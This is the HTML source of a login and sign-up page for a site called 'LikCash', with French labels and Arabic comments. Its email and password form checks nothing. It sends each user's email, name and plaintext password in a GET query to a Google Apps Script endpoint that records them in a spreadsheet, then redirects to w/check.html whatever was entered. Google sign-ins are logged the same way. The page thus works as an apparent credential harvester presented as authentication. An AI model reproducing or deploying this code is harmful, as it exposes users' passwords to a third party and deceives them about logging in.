<!DOCTYPE html> 
<html lang="fr" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LikCash | Authentification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@700;900&display=swap" rel="stylesheet">
    
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>

    <style>
        body { font-family: 'Tajawal', sans-serif; background: #fdfdfd; }
        .hidden { display: none !important; }
        /* تصميم الحقول بشكل عصري */
        .input-field { 
            background: #f8fafc; 
            border: 2px solid #e2e8f0; 
            transition: all 0.3s ease; 
            font-weight: 700;
            text-align: left;
        }
        .input-field:focus { 
            border-color: #2563eb; 
            background: #fff; 
            outline: none; 
            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); 
        }
        /* لودر التحميل */
        .loader { 
            width: 20px; height: 20px; 
            border: 3px solid rgba(255,255,255,0.3); 
            border-top-color: #fff; 
            border-radius: 50%; 
            animation: spin 0.8s linear infinite; 
            display: none; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4 bg-slate-50">

    <div id="customModal" class="hidden fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-[100] p-4">
        <div class="bg-white rounded-[2rem] max-w-xs w-full p-8 shadow-2xl text-center">
            <h3 id="modalTitle" class="text-xl mb-2 text-slate-900 font-black"></h3>
            <p id="modalMessage" class="text-slate-500 text-sm mb-6"></p>
            <button onclick="closeModal()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">OK</button>
        </div>
    </div>

    <div class="max-w-md w-full bg-white rounded-[2.5rem] p-8 shadow-xl border border-slate-100 text-center">
        <img src="https://i.postimg.cc/zffZkRtk/31998-removebg-preview.png" alt="LikCash" class="h-10 mx-auto mb-6">
        
        <h2 id="title" class="text-2xl text-slate-800 mb-8 font-black italic uppercase text-blue-600">Connexion</h2>

        <form id="authForm" onsubmit="handleAction(event)" class="space-y-4 text-right">
            <div id="name-field" class="hidden space-y-1">
                <label class="text-[10px] text-slate-400 mr-2 font-bold">NOM COMPLET</label>
                <input type="text" id="userName" placeholder="Votre nom" class="input-field w-full px-5 py-3.5 rounded-2xl">
            </div>

            <div class="space-y-1">
                <label class="text-[10px] text-slate-400 mr-2 font-bold">EMAIL</label>
                <input type="email" id="userEmail" placeholder="mail@example.com" class="input-field w-full px-5 py-3.5 rounded-2xl font-sans" required>
            </div>

            <div class="space-y-1">
                <label class="text-[10px] text-slate-400 mr-2 font-bold">MOT DE PASSE</label>
                <input type="password" id="userPass" placeholder="••••••••" class="input-field w-full px-5 py-3.5 rounded-2xl" required>
            </div>
            
            <button type="submit" id="mainBtn" class="w-full bg-slate-900 text-white py-4 rounded-2xl text-lg flex items-center justify-center gap-3 hover:bg-blue-600 transition-all shadow-lg mt-4">
                <span id="btnText">SE CONNECTER</span>
                <div id="btnLoader" class="loader"></div>
            </button>
        </form>

        <div class="relative my-8 flex items-center justify-center">
            <div class="absolute inset-0 flex items-center"><span class="w-full border-t border-slate-100"></span></div>
            <span class="relative bg-white px-4 text-slate-400 text-[10px] font-bold">OU CONTINUER AVEC</span>
        </div>

        <button onclick="loginWithGoogle()" class="flex items-center justify-center gap-3 w-full border-2 border-slate-100 py-3.5 rounded-2xl hover:bg-slate-50 transition-all group">
            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-5 group-hover:scale-110 transition-transform">
            <span class="text-[11px] font-black text-slate-700">GOOGLE ACCOUNT</span>
        </button>

        <div class="mt-8 pt-4 border-t border-slate-50">
            <p id="toggle-text" class="text-slate-400 text-xs font-bold">Pas encore de compte ?</p>
            <button onclick="toggleMode()" id="toggle-btn" class="text-blue-600 text-[11px] font-black uppercase mt-1">Créer un compte</button>
        </div>
    </div>

    <script>
        // 1. إعدادات Firebase (المعلومات اللي فالتصويرة)
        const firebaseConfig = {
            apiKey: "AIzaSyBP77A_0dc3Z1H6jrUmhtapLF1w0Gbe4B8",
            authDomain: "likcash-auth.firebaseapp.com",
            projectId: "likcash-auth",
            storageBucket: "likcash-auth.firebasestorage.app",
            messagingSenderId: "19126222896",
            appId: "1:19126222896:web:0a6416948afa024e53adf5"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();

        // 2. رابط السكربت الجديد ديالك
        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyZ80dqN4q8EyK9mTGmMl7YRN02ur5MnGLOvCscz77DDVK8B-zhq4Nx1ehS402luraYNw/exec";
        
        let mode = "login";

        // تبديل الواجهة
        function toggleMode() {
            mode = (mode === "signup") ? "login" : "signup";
            document.getElementById('title').innerText = mode === "signup" ? "INSCRIPTION" : "CONNEXION";
            document.getElementById('name-field').classList.toggle('hidden', mode !== "signup");
            document.getElementById('btnText').innerText = mode === "signup" ? "S'INSCRIRE" : "SE CONNECTER";
            document.getElementById('toggle-text').innerText = mode === "signup" ? "Déjà un compte ?" : "Pas encore de compte ?";
            document.getElementById('toggle-btn').innerText = mode === "signup" ? "Connexion" : "Créer un compte";
        }

        // إغلاق التنبيه
        function closeModal() { document.getElementById('customModal').classList.add('hidden'); }
        function showMsg(t, m) { 
            document.getElementById('modalTitle').innerText = t;
            document.getElementById('modalMessage').innerText = m;
            document.getElementById('customModal').classList.remove('hidden');
        }

        // --- الدخول العادي (Sheets Only) ---
        async function handleAction(event) {
            event.preventDefault();
            const email = document.getElementById('userEmail').value;
            const pass = document.getElementById('userPass').value;
            const name = document.getElementById('userName').value || email.split('@')[0];

            document.getElementById('btnText').classList.add('hidden');
            document.getElementById('btnLoader').style.display = "block";

            try {
                // إرسال للجدول فقط (MANUEL)
                await fetch(`${SCRIPT_URL}?action=saveData&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&pass=${encodeURIComponent(pass)}`);
                
                sessionStorage.setItem('userEmail', email);
                window.location.replace("w/check.html");
            } catch (e) {
                showMsg("Erreur", "Problème de connexion");
            } finally {
                document.getElementById('btnText').classList.remove('hidden');
                document.getElementById('btnLoader').style.display = "none";
            }
        }

        // --- الدخول بجوجل (Firebase + Sheets) ---
        async function loginWithGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            try {
                const result = await auth.signInWithPopup(provider);
                const user = result.user;
                
                // إرسال للجدول (GOOGLE)
                fetch(`${SCRIPT_URL}?action=saveData&email=${encodeURIComponent(user.email)}&name=${encodeURIComponent(user.displayName)}&pass=GOOGLE_AUTH`);
                
                sessionStorage.setItem('userEmail', user.email);
                window.location.replace("w/check.html");
            } catch (e) {
                showMsg("Erreur", "Échec de l'authentification Google");
            }
        }
    </script>
</body>
</html>
